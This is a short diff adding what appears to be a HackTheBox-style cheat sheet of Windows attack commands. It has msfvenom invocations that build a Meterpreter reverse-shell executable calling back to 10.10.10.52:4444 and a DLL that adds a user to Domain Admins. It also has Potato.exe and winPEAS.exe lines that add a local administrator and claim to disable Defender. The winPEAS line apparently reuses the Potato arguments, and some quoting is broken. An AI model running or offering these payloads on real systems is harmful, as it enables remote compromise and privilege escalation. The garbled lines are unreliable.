@@ -1,0 +1,11 @@
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.52 lport=4444 prependmigrate=true prependmigrateprocess=explorer.exe -f exe > /home/mayomacam/hackthebox/exploit/scsiaccess.exe
+
+
+msfvenom -p windows/x64/exec cmd='net group "domain admins" melanie /add /domain' --platform windows -f dll > dns.dll
+
+
+
+Potato.exe -ip 10.10.10.10 -cmd C:\\Windows\\System32\\cmd.exe -K net localgroup administrators roguesecurity /ADD" -disable_exhaust true -disable_defender true
+
+
+winPEAS.exe -cmd C:\\Windows\\System32\\cmd.exe -K net localgroup administrators roguesecurity /ADD" -disable_exhaust true -disable_defender true
